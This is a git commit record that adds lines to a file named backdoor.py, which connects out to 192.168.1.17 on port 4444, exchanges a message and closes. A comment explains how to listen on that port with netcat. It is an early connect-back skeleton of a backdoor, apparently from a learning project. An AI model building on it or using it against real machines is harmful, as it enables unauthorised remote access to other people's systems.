03c2f3493ecd6b9a90e4a9a765e63c11a4dd8dfe
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-09-04 04:07:27 -0400

    Basic working principal

--- backdoor.py
+++ backdoor.py
@@ -4,7 +4,10 @@ import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("192.168.1.17", 4444))
 
-
+s.send("\n[+] Connection Successful!!!\n")
+recved_data = s.recv(1024)
+print(recved_data)
+s.close()
 '''
 In 192.168.1.17 we listen for incoming connections using netcat
 >nc -vv -l -p 4444
